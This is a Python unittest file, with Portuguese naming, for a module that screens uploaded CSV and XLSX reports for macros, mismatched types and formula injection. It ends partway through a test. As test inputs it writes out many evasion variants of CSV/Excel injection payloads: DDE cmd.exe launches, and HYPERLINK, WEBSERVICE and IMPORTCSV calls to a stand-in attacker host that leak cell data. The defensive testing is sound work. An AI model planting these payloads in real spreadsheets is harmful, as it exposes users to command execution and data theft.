"""Triagem dos relatórios: extensão, tipo declarado e, principalmente, o conteúdo."""

import hashlib
import time
import unittest
from unittest import mock
import warnings
import zipfile

import sanitizacao
from tests.apoio import (CSV, PRINCIPAL, PRINCIPAL_COM_MACRO, PRINCIPAL_DE_MODELO, RELACAO, TIPO_DA_ABA, TIPO_XLSX,
                         com_bit_de_cifra, default, folha, override, relacao, xlsx)

MAX = 15 * 1024 * 1024
_PLANILHA = "application/vnd.openxmlformats-officedocument.spreadsheetml."
HYPERLINK = 'HYPERLINK("http://atacante.exemplo","x")'
WEBSERVICE = '_xlfn.WEBSERVICE("http://atacante.exemplo/?"&amp;Vendas!$B$1)'


def triar(nome, conteudo, tipo=None):
    tipo = tipo or (TIPO_XLSX if nome.lower().endswith(".xlsx") else "text/csv")
    return sanitizacao.triar(nome, tipo, conteudo, MAX)


def triar_com_prazo(nome, conteudo, prazo):
    tipo = TIPO_XLSX if nome.lower().endswith(".xlsx") else "text/csv"
    return sanitizacao.triar(nome, tipo, conteudo, MAX, prazo)


def com_formula(formula: str) -> bytes:
    return xlsx(planilha=folha(f'<c r="A1"><f>{formula}</f></c>'))


class ExtensaoETipoTests(unittest.TestCase):
    def test_macro_recusada_pela_extensao_e_pelo_tipo(self):
        for nome, tipo in (("vendas.xlsm", TIPO_XLSX), ("VENDAS.XLSM", "application/octet-stream"),
                           ("modelo.xltm", TIPO_XLSX),
                           ("vendas.xlsx", "application/vnd.ms-excel.sheet.macroEnabled.12")):
            with self.subTest(nome=nome, tipo=tipo):
                resultado = triar(nome, xlsx(), tipo)
                self.assertFalse(resultado.aprovado)
                self.assertEqual(resultado.motivo, sanitizacao.MOTIVO_MACRO)

    def test_so_csv_e_xlsx(self):
        for nome in ("vendas.xls", "vendas.pdf", "vendas.exe", "vendas", "vendas.csv.exe", "vendas.txt"):
            with self.subTest(nome=nome):
                self.assertEqual(triar(nome, CSV, "text/csv").motivo, sanitizacao.MOTIVO_FORMATO)

    def test_tipo_declarado_precisa_conferir_com_a_extensao(self):
        self.assertFalse(triar("vendas.xlsx", xlsx(), "text/plain").aprovado)
        self.assertFalse(triar("vendas.csv", CSV, "image/png").aprovado)
        self.assertFalse(sanitizacao.triar("vendas.csv", "", CSV, MAX).aprovado)
        self.assertFalse(sanitizacao.triar("vendas.csv", None, CSV, MAX).aprovado)
        for tipo in ("text/csv", "application/vnd.ms-excel", "text/plain", "application/octet-stream",
                     "text/csv; charset=utf-8"):
            with self.subTest(tipo=tipo):
                self.assertTrue(triar("vendas.csv", CSV, tipo).aprovado)

    def test_vazio_e_acima_do_teto(self):
        self.assertEqual(triar("vendas.csv", b"").motivo, "O arquivo está vazio.")
        self.assertFalse(sanitizacao.triar("vendas.csv", "text/csv", CSV, len(CSV) - 1).aprovado)

    def test_nome_exibido_e_extensao_do_nome_original(self):
        # Um nome todo fora do alfabeto latino continua com a extensão (o secure_filename a perderia).
        resultado = triar("продажи.csv", CSV)
        self.assertTrue(resultado.aprovado)
        self.assertEqual(resultado.nome, "продажи.csv")
        self.assertEqual(sanitizacao.nome_exibido("../../pasta/vendas.csv"), "vendas.csv")
        self.assertEqual(sanitizacao.nome_exibido("C:\\Users\\Ana\\vendas.csv"), "vendas.csv")
        self.assertEqual(sanitizacao.nome_exibido("ven\x00das" + chr(0x200B) + ".csv"), "vendas.csv")
        longo = sanitizacao.nome_exibido("x" * 300 + ".xlsx")
        self.assertEqual((len(longo), longo[-5:]), (100, ".xlsx"))
        self.assertEqual(sanitizacao.nome_exibido(""), "arquivo")
        self.assertEqual(sanitizacao.extensao("relatorio.CSV "), "csv")

    def test_nome_exibido_sem_marcacao_nem_inicio_de_formula(self):
        self.assertEqual(sanitizacao.nome_exibido('"><script>x.csv'), "scriptx.csv")
        for nome in ('=HYPERLINK("x").csv', "+soma.csv", "-desconto.csv", "@vendas.csv", ' "=x.csv'):
            with self.subTest(nome=nome):
                self.assertTrue(sanitizacao.nome_exibido(nome).startswith("_"))

    def test_aprovado_leva_o_conteudo_intacto_e_o_sha256(self):
        resultado = triar("vendas.csv", CSV)
        self.assertEqual((resultado.conteudo, resultado.tipo, resultado.formato, resultado.tamanho),
                         (CSV, "text/csv", "csv", len(CSV)))
        self.assertEqual(len(resultado.sha256), 64)


class CsvTests(unittest.TestCase):
    def test_csv_comum_passa(self):
        casos = (
            CSV,
            (chr(0xFEFF) + "Codigo,Produto,Total\n1,Café,10.50\n").encode("utf-8"),
            "Código;Descrição;Total\r\n1;Pão francês;-3,20\r\n".encode("cp1252"),
            b"Codigo\tProduto\n1\tArroz\n",
            b"Codigo|Produto|Total\n1|Arroz|-12,50\n",
            # Fórmulas inofensivas e textos que começam com sinal: o Excel não chama nada externo.
            b"Codigo;Produto;Obs\n1;Arroz;=1+1\n2;Feijao;==========\n3;Cafe;- Desconto especial (cliente)\n"
            b"4;Leite;=SOMA(A1:A3)\n5;Oleo;+5\n",
            b"Codigo;Produto\n1;Arroz\n\x1a",
            # Fim de linha do Mac antigo (só CR) e aspas com o separador dentro.
            b"Codigo;Produto\r1;Arroz\r2;Feijao\r",
            b'Codigo;Produto;Obs\n1;"Arroz; tipo 1";"TV 32"""\n',
            b"sep=;\nCodigo;Produto\n1;Arroz\n",
        )
        for conteudo in casos:
            with self.subTest(conteudo=conteudo[:40]):
                self.assertIsNone(sanitizacao.conferir_csv(conteudo))

    def test_injecao_de_formula_e_recusada(self):
        perigosos = (
            b"Codigo;Produto\n1;=cmd|' /C calc'!A0\n",
            b"Codigo;Produto\n1;+HYPERLINK(\"http://atacante.exemplo\";\"clique\")\n",
            b"Codigo;Produto\n1;@SUM(1+1)*cmd|' /C calc'!A0\n",
            b"Codigo;Produto\n1;-2+3+cmd|' /C calc'!A0\n",
            b"Codigo,Produto\n1,\"=HYPERLINK(\"\"http://atacante.exemplo\"\",\"\"x\"\")\"\n",
            b"=WEBSERVICE(\"http://atacante.exemplo\")\n1;2\n",
            b"Codigo;Produto\n1;  =_xlfn.WEBSERVICE(\"http://x\")\n",
            b"Codigo;Produto\n1;\t=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!''\n",
            # O separador da linha sep= e a barra vertical.
            b"sep=|\n1|=HYPERLINK(\"http://atacante.exemplo\";\"clique\")\n",
            b"sep=^\nCodigo^Produto\n1^=HYPERLINK(\"http://atacante.exemplo\")\n",
            b"Codigo|Produto\n1|=WEBSERVICE(\"http://atacante.exemplo\")\n",
            # DDE num campo entre aspas com o separador (ou uma quebra de linha) dentro.
            b"Codigo;Produto\n1;\"=cmd|' /C calc&rem ;'!A0\"\n",
            b"Codigo,Produto\n1,\"=cmd|' /C calc&rem ,'!A0\"\n",
            b"Codigo;Produto\n1;\"=cmd|' /C calc&rem\n'!A0\"\n",
            # Fim de linha só com CR: cada linha é uma linha para o Excel.
            b"Codigo;Produto\r1;Arroz\r=HYPERLINK(\"http://atacante.exemplo\")\r",
            # O leitor de CSV junta o que vem depois da aspa de fechamento: "=HYPER"LINK( vira =HYPERLINK(.
            b"Codigo;Produto\n1;\"=HYPER\"LINK(\"http://atacante.exemplo\")\n",
            b"Codigo;Produto\n1;\"=HYPERLINK\"(\"http://atacante.exemplo\")\n",
            # A linha inteira é uma célula para o separador que não está nela (aqui, a vírgula).
            b"Codigo;Produto\n=cmd|' /C calc;x'!A0\n",
            # Maiúsculas e minúsculas misturadas e espaço antes do parêntese.
            b"Codigo;Produto\n1;=HyPeRlInK \t(\"http://atacante.exemplo\")\n",
        )
        for conteudo in perigosos:
            with self.subTest(conteudo=conteudo[:50]):
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_binario_pagina_ou_texto_sem_colunas(self):
        casos = {
            "planilha renomeada": xlsx(),
            "excel antigo": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 100,
            "pdf": b"%PDF-1.4\n1 0 obj",
            "byte nulo": b"Codigo;Produto\n1;Arr\x00oz\n",
            "controle": b"Codigo;Produto\n1;Arr\x07oz\n",
            "html": b"<html><body><table><tr><td>1;2</td></tr></table></body></html>",
            "xml": b"<?xml version=\"1.0\"?><a>1;2</a>",
            "utf-16": "Codigo;Produto\n".encode("utf-16"),
            "sem separador": b"Relatorio de vendas\nsem colunas\n",
            "em branco": b"\n\n   \n",
        }
        for rotulo, conteudo in casos.items():
            with self.subTest(caso=rotulo):
                self.assertIsNotNone(sanitizacao.conferir_csv(conteudo))

    def test_csv_grande_so_confere_celula_a_celula_as_linhas_candidatas(self):
        linhas = b"123456;\"Produto qualquer\";10;-12,50;16/11/2026;Promo!\n" * 300_000  # uns 15 MB
        ultima = 300_000 + 3  # o cabeçalho e as duas linhas do CSV vêm antes
        com_barras = b"123456|\"Produto qualquer\"|10|-12,50|16/11/2026\n" * 300_000
        casos = {
            # Datas e exclamações em toda linha não são gatilho.
            "sem gatilho": (CSV + linhas, []),
            # Um gatilho no fim leva à leitura célula a célula, mas só da linha dele.
            "gatilho inofensivo no fim": (CSV + linhas + b"1;texto com hyperlink(x;2\n", [ultima]),
            # A barra vertical seguida de exclamação (o DDE) só na última linha.
            "barras com exclamação": (CSV.replace(b";", b"|") + com_barras + b"1|PROMO!|2\n", [ultima]),
            # Nome de função sem parêntese não é candidato.
            "nome sem parêntese": (CSV + linhas + b"1;imagem do produto;2\n", []),
        }
        for rotulo, (conteudo, candidatas) in casos.items():
            with self.subTest(caso=rotulo):
                plano = conteudo.replace(b'"', b"").lower().decode("utf-8")
                self.assertEqual([numero for numero, _linha in sanitizacao._linhas_candidatas(plano, None)],
                                 candidatas)
                inicio = time.perf_counter()
                self.assertIsNone(sanitizacao.conferir_csv(conteudo))
                # Folgado de propósito (a máquina pode estar ocupada); o caminho antigo, célula a célula no
                # arquivo inteiro, levava mais de 10 s em cada caso.
                self.assertLess(time.perf_counter() - inicio, 30)

    def test_linha_ou_registro_de_mais_de_1_mb_recusa_sem_ler_celula_a_celula(self):
        # Uma linha candidata enorme seria lida inteira em cada separador; um registro enorme (aspas com quebra
        # de linha dentro) viraria uma lista de milhões de células na memória.
        linha_enorme = b"Codigo;Produto\n" + b"=a;=a,=a\t=a|" * 100_000 + b"xdde(\n"
        registro_enorme = b"Codigo;Produto\n" + b'"\n";' * 300_000 + b'x;"image(\n'
        for rotulo, conteudo in (("linha", linha_enorme), ("registro", registro_enorme)):
            with self.subTest(caso=rotulo):
                inicio = time.perf_counter()
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_CSV_MALFORMADO)
                self.assertLess(time.perf_counter() - inicio, 30)

    def test_bom_com_byte_fora_do_utf8_nao_esconde_a_primeira_celula(self):
        # Com a marca do UTF-8, o Excel lê o arquivo como UTF-8 e troca o byte inválido; o texto conferido é o
        # mesmo, e a marca não fica grudada na primeira célula.
        for primeira in (b'=HYPERLINK("https://example.invalid/x")', b'=WEBSERVICE("https://example.invalid/x")',
                         b"=cmd|' /C calc'!A0"):
            with self.subTest(primeira=primeira[:12]):
                conteudo = b"\xef\xbb\xbf" + primeira + b";x\nCaf\xe9;1\n"
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)
        self.assertIsNone(sanitizacao.conferir_csv(b"\xef\xbb\xbfCodigo;Produto\n1;Caf\xe9\n"))
        # Os 5 bytes que o cp1252 não define não derrubam a leitura.
        self.assertIsNone(sanitizacao.conferir_csv(b"Codigo;Produto\n1;Caf\x81\x8d\n"))

    def test_nomes_em_portugues_funcoes_novas_e_lambda_eta(self):
        perigosos = {
            "HIPERLINK": '1;=HIPERLINK("https://example.invalid/x")'.encode("cp1252"),
            "SERVIÇOWEB em cp1252": '1;=SERVIÇOWEB("https://example.invalid/x")'.encode("cp1252"),
            "SERVIÇOWEB em UTF-8": '1;=_xlfn.SERVIÇOWEB("https://example.invalid/x")'.encode("utf-8"),
            # O Ç em UTF-8 num arquivo que, por outro byte, é lido em cp1252 (Ã‡), e o contrário (caractere de
            # substituição): o Excel com o UTF-8 como página de código leria a função.
            "SERVIÇOWEB lido errado": '1;=SERVIÇOWEB("x");Café'.encode("utf-8")[:-2] + b"\xe9",
            "IMAGEM": b'1;=IMAGEM("https://example.invalid/x.png")',
            "FILTROXML": b'1;=FILTROXML(A1;"//a")',
            "IMPORTCSV": b'1;=IMPORTCSV("https://example.invalid/vazar")',
            "IMPORTARTEXTO": b'1;=IMPORTARTEXTO("\\\\example.invalid\\pasta\\x.txt")',
            "IDENT.REGISTRO": b'1;=IDENT.REGISTRO("kernel32";"WinExec")',
            "lambda eta entre aspas": b'1;"=MAP(A1:A3;WEBSERVICE)"',
            "lambda eta com LET": b'1;=LET(f,WEBSERVICE,f("https://example.invalid/x"))',
        }
        for rotulo, linha in perigosos.items():
            with self.subTest(caso=rotulo):
                self.assertEqual(sanitizacao.conferir_csv(b"Codigo;Obs\n" + linha + b"\n"), sanitizacao.MOTIVO_FORMULA)
        # A palavra sem parêntese continua passando.
        self.assertIsNone(sanitizacao.conferir_csv("Codigo;Obs\n1;- imagem do produto, serviço web\n".encode()))

    def test_referencia_a_outro_arquivo_e_recusada(self):
        for formula in (b"=SUM([Budget.xls]Annual!C10:C25)", b"='\\\\example.invalid\\share\\[Budget.xls]Annual'!C10",
                        b"='https://example.invalid/pasta/[Budget.xlsx]Annual'!C10",
                        b"=SUM('C:\\Reports\\[Budget.xlsx]Annual'!C10:C25)", b"+'\\\\host\\c$\\x'!A1"):
            with self.subTest(formula=formula):
                self.assertEqual(sanitizacao.conferir_csv(b"Codigo;Total\n1;" + formula + b"\n"),
                                 sanitizacao.MOTIVO_FORMULA)
        # Aba da própria planilha, exclamação num texto e data com barra passam.
        self.assertIsNone(sanitizacao.conferir_csv(b"Codigo;Total;Obs\n1;=Plan1!A1;16/11/2026 Promo!\n"))

    def test_separador_declarado_aspas_ou_letra_e_recusado(self):
        # No texto da leitura sem aspas, as aspas saem e as letras ficam minúsculas: como separador, não teriam
        # leitura nele (com sep=A, a célula =WEBSERVICE(B1) passaria).
        for conteudo in (b'sep="\nCodigo"Produto\n', b"sep=A\n1A=WEBSERVICE(B1)\n", b"sep=x\n1x=WEBSERVICE(B1)\n"):
            with self.subTest(conteudo=conteudo[:6]):
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_CSV_MALFORMADO)
        self.assertIsNone(sanitizacao.conferir_csv(b"sep=#\nCodigo#Produto\n1#Arroz\n"))

    def test_cp1252_com_os_bytes_que_ele_nao_define_decodifica_rapido_e_como_o_windows(self):
        # Os 5 bytes que o cp1252 do Python não define (0x81, 0x8D, 0x8F, 0x90, 0x9D) viram o caractere de mesmo
        # número, como no Windows, pela tabela em C; com o tratador de erro em Python, 15 MB deles custavam 12 s.
        todos = bytes(range(32, 256))
        esperado = "".join(chr(byte) if byte in (0x81, 0x8D, 0x8F, 0x90, 0x9D) else bytes([byte]).decode("cp1252")
                           for byte in range(32, 256))
        self.assertEqual(sanitizacao._texto(todos), esperado)
        conteudo = b"Codigo;Produto\n" + (b"\x81" * 1023 + b"\n") * 15_000
        inicio = time.perf_counter()
        self.assertIsNone(sanitizacao.conferir_csv(conteudo, time.monotonic() + 30))
        self.assertLess(time.perf_counter() - inicio, 10)

    def test_gatilhos_achados_por_busca_literal(self):
        plano = "a|b\nc!d\n x]aba!b\ny]]!\nz'!\nw]a b!\n"
        self.assertEqual([numero for numero, _linha in sanitizacao._linhas_candidatas(plano, None)], [0, 2, 4])
        # A barra seguida de outra barra antes da exclamação não é DDE; a exclamação antes da barra também não. A
        # quebra de linha não interrompe o DDE (o tópico pode ter uma, num campo entre aspas).
        self.assertEqual([numero for numero, _linha in sanitizacao._linhas_candidatas("!x|y|z\nw\n", None)], [])
        self.assertEqual([numero for numero, _linha in sanitizacao._linhas_candidatas("a|b|\n!c\n", None)], [0])
        # Muitos colchetes sem aba depois: o arquivo passa, sem uma expressão regular sobre o texto inteiro.
        inicio = time.perf_counter()
        self.assertIsNone(sanitizacao.conferir_csv(b"Codigo;Obs\n|" + b"]" * 2_000_000 + b"\n", time.monotonic() + 30))
        self.assertLess(time.perf_counter() - inicio, 10)

    def test_prazo_vale_dentro_de_linhas_longas(self):
        # Poucas linhas candidatas, cada uma abaixo de 1 MB e com milhões de separadores: o prazo é conferido por
        # linha, por separador e por registro, e não só a cada 4096 linhas.
        linha = b"xhyperlink(" + (b";" * 100_000 + b",\t|") * 9 + b"\n"
        conteudo = b'"a";b,c\td|e\n' + linha * 12
        inicio = time.perf_counter()
        resultado = sanitizacao.conferir_csv(conteudo, time.monotonic() + 0.2)
        self.assertEqual(resultado, sanitizacao.MOTIVO_DEMORADO)
        self.assertLess(time.perf_counter() - inicio, 5)

    def test_bom_com_bytes_invalidos_e_aspas_as_duas_leituras_veem_os_mesmos_caracteres(self):
        # Com 'replace', tirar as aspas dos bytes juntaria bytes inválidos num caractere válido; o texto sem aspas
        # sai do texto já decodificado.
        for conteudo in (b'\xef\xbb\xbfa;b\n"x;=\xc3"\xa9HYPERLINK(1)"\n',
                         b'\xef\xbb\xbfsep=\xff\nx\xc3"\xa9=WEBSERVICE(A1)\n'):
            with self.subTest(conteudo=conteudo[:12]):
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_aspa_que_sobra_na_celula_e_lida_como_no_texto_sem_aspas(self):
        # A célula da leitura com aspas é conferida sem as aspas que sobraram nela, como o texto da busca das
        # linhas candidatas: a aspa no lugar do Ç não forma SERVIÇOWEB, e a escapada no meio do nome não o esconde.
        self.assertIsNone(sanitizacao.conferir_csv(b'Codigo;Obs\n1;=SERVI"OWEB(A1);x\n'))
        self.assertEqual(sanitizacao.conferir_csv(b'Codigo;Obs\n1;"=HYPER""LINK(1)"\n'), sanitizacao.MOTIVO_FORMULA)

    def test_leitura_do_registro_inteiro_acontece_com_os_quatro_separadores(self):
        delimitadores = []
        original = sanitizacao.csv.reader

        def espiao(linhas, delimiter):
            delimitadores.append(delimiter)
            return original(linhas, delimiter=delimiter)

        with mock.patch.object(sanitizacao.csv, "reader", espiao):
            self.assertIsNone(sanitizacao.conferir_csv(b'a;b,c\td|e\n"x";texto imagem(1);\n'))
        self.assertEqual(delimitadores, [";", ",", "\t", "|", sanitizacao._SEPARADOR_AUSENTE])

    def test_nome_de_funcao_como_texto_de_coluna_nao_recusa_o_relatorio(self):
        # O nome sozinho como argumento só vale depois de um parêntese aberto (MAP(...;WEBSERVICE)): numa linha que
        # começa com sinal, a coluna "Imagem" e o código exportado como ="0001" passam.
        for linha in ("-1;Imagem;TV 32;1;-899,00", "-;Imagem;Cabo HDMI;2;30,00", '="0001";Imagem;TV 32;1;899,00',
                      "-150,00;WebService;Pedido 123;1;-150,00", "1;Troca, -10% no total;Imagem;1;899,00",
                      "1;Kit | -20%;Imagem;1;50,00"):
            with self.subTest(linha=linha):
                conteudo = ("Codigo;Departamento;Produto;Qtd;Total\n" + linha + "\n").encode("cp1252")
                self.assertIsNone(sanitizacao.conferir_csv(conteudo))
        for formula in ("=MAP(A1:A3;WEBSERVICE)", "=LET(f,WEBSERVICE,f(A1))", "=LAMBDA(f,f(A1))(WEBSERVICE)"):
            with self.subTest(formula=formula):
                conteudo = f'Codigo;Obs\n1;"{formula}"\n'.encode()
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_parentese_que_nao_e_de_chamada_nao_torna_a_coluna_um_argumento(self):
        # O nome sozinho como argumento só conta depois do parêntese de uma chamada (colado a um nome ou a outro
        # parêntese): o parêntese de um nome de produto ou de um DDD, noutra coluna, não.
        for linha in ("-1;TV LED 32 (HD);Imagem;-899,00", "-;Cabo HDMI (2 m);Imagem;30,00",
                      '="0001";Smart TV 50 (4K);Imagem;2.999,00', "+55 (11) 3333-4444;Call;Maria",
                      "@lojacentro;Loja (Centro);Imagem;899,00", "-6;Ice (lata 269 ml);RTD;-23,94"):
            with self.subTest(linha=linha):
                conteudo = ("Qtd;Produto;Departamento;Total\n" + linha + "\n").encode("cp1252")
                self.assertIsNone(sanitizacao.conferir_csv(conteudo))
        for formula in ("=MAP (A1:A3;WEBSERVICE)", "=MAPA(A1:A3;SERVIÇOWEB)", "=_xlfn.BYROW(A1:A3,_xlfn.IMAGE)"):
            with self.subTest(formula=formula):
                conteudo = f'Codigo;Obs\n1;"{formula}"\n'.encode("cp1252")
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_funcao_entre_parenteses_e_chamada_em_seguida_e_recusada(self):
        # =(WEBSERVICE)(A1): o parêntese da chamada vem depois do nome. Por cautela, conta como a função passada
        # como valor, no .csv (com e sem aspas, e com o parêntese da chamada longe do nome) e no .xlsx.
        for formula in ("=(WEBSERVICE)(A1)", "=((WEBSERVICE))(A1)", "=( ( _xlfn.WEBSERVICE ) )(A1)", "-(Imagem)(1)",
                        "=(1,SERVIÇOWEB)(A1)"):
            with self.subTest(formula=formula):
                for conteudo in (f'Codigo;Obs\n1;"{formula}"\n', f"Codigo;Obs\n1;{formula}\n"):
                    self.assertEqual(sanitizacao.conferir_csv(conteudo.encode("cp1252")), sanitizacao.MOTIVO_FORMULA)
        # Entre aspas, a quebra de linha fica dentro da célula; e o parêntese da chamada pode estar longe do nome.
        for conteudo in (b'Codigo;Obs\n1;"+(IMAGEM\n)(A1)"\n',
                         b'Codigo;Obs\n1;"=(WEBSERVICE' + b" " * 200_000 + b")" * 300_000 + b'(A1)"\n'):
            with self.subTest(conteudo=conteudo[:24]):
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)
        self.assertEqual(triar("vendas.xlsx", com_formula("(_xlfn.WEBSERVICE)(B1)")).motivo, sanitizacao.MOTIVO_FORMULA)
        # Sem a chamada colada depois, o nome entre parênteses numa linha que começa com sinal continua passando.
        for linha in ("-1;Brinde (Imagem);TV;-5,00", "-1;(Imagem) (frente);TV;-5,00", "-1;(Imagem)\n(frente);-5"):
            with self.subTest(linha=linha):
                self.assertIsNone(sanitizacao.conferir_csv(("Qtd;Produto;Obs;Total\n" + linha + "\n").encode()))

    def test_busca_do_pre_filtro_tem_alcance_de_1_mb(self):
        # Uma sequência de espaços depois do nome, ou de letras depois do colchete, maior que o alcance da busca
        # conta como gatilho: a linha passa de 1 MB e é recusada, sem uma chamada em C sobre o arquivo inteiro.
        for conteudo in (b"a;b\n1;hyperlink" + b" " * 1_200_000 + b"(x)\n", b"a;b\n1;]" + b"a" * 1_200_000 + b"\n"):
            with self.subTest(conteudo=conteudo[:16]):
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_CSV_MALFORMADO)
        # Na fronteira dos blocos do texto sem aspas (de 1 milhão de caracteres), a fórmula continua inteira.
        prefixo = b"a;b\n" + (b"x" * 999 + b"\n") * 999 + b"1;" + b"y" * 980
        for deslocamento in range(0, 30, 3):
            with self.subTest(deslocamento=deslocamento):
                conteudo = prefixo + b"z" * deslocamento + b";=HYPERLINK(1)\n"
                self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_campo_acima_de_128_kb_e_abaixo_de_1_mb_passa(self):
        conteudo = b'Codigo;Obs;Depto\n1;"' + b"x" * 200_000 + b'";Audio\n2;"Cabo";Imagem;\n'
        self.assertIsNone(sanitizacao.conferir_csv(conteudo))

    def test_a_leitura_sem_aspas_usa_a_codificacao_do_arquivo(self):
        # Tirar as aspas torna válido o UTF-8 deste arquivo (C3 22 A9 vira C3 A9); lido em UTF-8, o ]ÂŠ! do cp1252
        # (o que o Excel vê) viraria um caractere de controle, e a referência a outra pasta passaria.
        conteudo = b'Codigo;Obs\n1;=SUM([x.xlsx]\xc2\x8a!A1)\n2;Caf\xc3"\xa9\n'
        self.assertEqual(sanitizacao.conferir_csv(conteudo), sanitizacao.MOTIVO_FORMULA)

    def test_prazo_vencido_recusa_sem_ler_o_arquivo_todo(self):
        vencido = time.monotonic() - 1
        for nome, conteudo in (("vendas.csv", CSV), ("vendas.xlsx", xlsx())):
            with self.subTest(nome=nome):
                resultado = triar_com_prazo(nome, conteudo, vencido)
                self.assertEqual((resultado.aprovado, resultado.motivo), (False, sanitizacao.MOTIVO_DEMORADO))
        self.assertTrue(triar_com_prazo("vendas.csv", CSV, time.monotonic() + 60).aprovado)


class XlsxTests(unittest.TestCase):
    def test_planilha_comum_passa_inclusive_com_formula_inofensiva(self):
        self.assertIsNone(sanitizacao.conferir_xlsx(xlsx()))
        self.assertIsNone(sanitizacao.conferir_xlsx(com_formula("SUM(B1:B3)")))
        com_impressora = xlsx(extras={"xl/printerSettings/printerSettings1.bin": b"\x00\x01binario"},
                              tipos=default("bin", _PLANILHA + "printerSettings"))
        self.assertIsNone(sanitizacao.conferir_xlsx(com_impressora))
        # Partes comuns de planilha de verdade: textos, estilos, tema, propriedades, nome de área de impressão,
        # formatação condicional e validação inofensivas, e a aba noutra pasta (achada pela relação).
        completa = xlsx(
            aba="xl/abas/vendas.xml",
            planilha=folha('<c r="A1" t="s"><v>0</v></c>', depois=(
                '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1">'
                '<formula>LEN(A1)&gt;3</formula></cfRule></conditionalFormatting>'
                '<dataValidations count="1"><dataValidation type="list" sqref="B1"><formula1>"a,b"</formula1>'
                '</dataValidation></dataValidations>')),
            nomes_definidos='<definedName name="_xlnm.Print_Area" localSheetId="0">Vendas!$A$1:$B$2</definedName>',
            extras={"xl/sharedStrings.xml": '<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
                                            '<si><t>Produto</t></si></sst>',
                    "xl/styles.xml": '<styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"/>',
                    "docProps/core.xml": '<cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/'
                                         '2006/metadata/core-properties"/>'},
            tipos=(override("xl/sharedStrings.xml", _PLANILHA + "sharedStrings+xml")
                   + override("xl/styles.xml", _PLANILHA + "styles+xml")
                   + override("docProps/core.xml", "application/vnd.openxmlformats-package.core-properties+xml")),
            relacoes=(relacao("rId2", "sharedStrings", "sharedStrings.xml") + relacao("rId3", "styles", "styles.xml")),
            relacoes_da_raiz=relacao("rId2", "http://schemas.openxmlformats.org/package/2006/relationships/metadata/"
                                             "core-properties", "docProps/core.xml"))
        self.assertIsNone(sanitizacao.conferir_xlsx(completa))

    def test_formula_que_chama_fora_e_recusada(self):
        for formula in (HYPERLINK, '_xlfn.WEBSERVICE("http://atacante.exemplo")', 'FILTERXML(A1,"//a")',
                        "cmd|' /C calc'!A0", 'hyperlink ("http://atacante.exemplo")'):
            with self.subTest(formula=formula):
                self.assertEqual(sanitizacao.conferir_xlsx(com_formula(formula)), sanitizacao.MOTIVO_FORMULA)

    def test_funcoes_que_buscam_arquivo_lambda_eta_e_referencia_a_outro_arquivo(self):
        for formula in ('_xlfn.IMPORTCSV("http://atacante.exemplo/vazar")', '_xlfn.IMPORTTEXT("\\\\atacante\\x")',
                        '_xlfn.MAP("http://atacante.exemplo/?"&amp;A1,_xleta.WEBSERVICE)',
                        '_xlfn.LET(_xlpm.f,_xleta.WEBSERVICE,_xlpm.f("http://atacante.exemplo"))',
                        "_xlfn.BYROW(A1:A9,_xleta.HYPERLINK)", "SUM('\\\\atacante\\pasta\\[x.xlsx]Aba'!A1)",
                        "'https://atacante.exemplo/[x.xlsx]Aba'!A1", "[1]Aba!A1"):
            with self.subTest(formula=formula):
                self.assertEqual(sanitizacao.conferir_xlsx(com_formula(formula)), sanitizacao.MOTIVO_FORMULA)
        # Referência estruturada, outra aba da mesma pasta (inclusive com espaço e 3D) e texto entre aspas passam.
        for formula in ("VLOOKUP(Tabela1[[#This Row],[Codigo]],Plan2!A:B,2,0)", "SUM(Tabela1[Valor])+Plan2!A1",
                        "'Plan 1'!A1+SUM('Plan1:Plan3'!B2)", 'IF(A1="imagem",1,0)'):
            with self.subTest(formula=formula):
                self.assertIsNone(sanitizacao.conferir_xlsx(com_formula(formula)))

    def test_escape_do_ooxml_formula_em_atributo_macro_de_forma_e_publicacao_na_web(self):
        principal = "http://schemas.openxmlformats.org/spreadsheetml/2006/main"
        desenho = "application/vnd.openxmlformats-officedocument.drawing+xml"

        def com_forma(atributos):
            return xlsx(extras={"xl/drawings/drawing1.xml": (
                '<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing">'
                f'<xdr:twoCellAnchor><xdr:sp {atributos}/></xdr:twoCellAnchor></xdr:wsDr>')},
                tipos=override("xl/drawings/drawing1.xml", desenho))

        def com_cfvo(valor):
            return xlsx(planilha=folha(depois=(
                '<conditionalFormatting sqref="A1:A9"><cfRule type="colorScale" priority="1"><colorScale>'
                f'<cfvo type="formula" val="{valor}"/><cfvo type="max"/><color rgb="FFFF0000"/>'
                '<color rgb="FF00FF00"/></colorScale></cfRule></conditionalFormatting>')))

        perigosos = {
            "_xHHHH_ no H de HYPERLINK": (com_formula('_x0048_YPERLINK("http://atacante.exemplo","x")'),
                                          sanitizacao.MOTIVO_FORMULA),
            "_xHHHH_ no W de WEBSERVICE": (com_formula('_xlfn._x0057_EBSERVICE("http://atacante.exemplo")'),
                                           sanitizacao.MOTIVO_FORMULA),
            "_xHHHH_ na barra do DDE": (com_formula("cmd_x007C_' /C calc'!A0"), sanitizacao.MOTIVO_FORMULA),
            "fórmula no val do cfvo": (com_cfvo("LEN(_xlfn.WEBSERVICE(&quot;http://atacante.exemplo&quot;))"),
                                       sanitizacao.MOTIVO_FORMULA),
            "vínculo do texto da forma com outro arquivo": (com_forma(
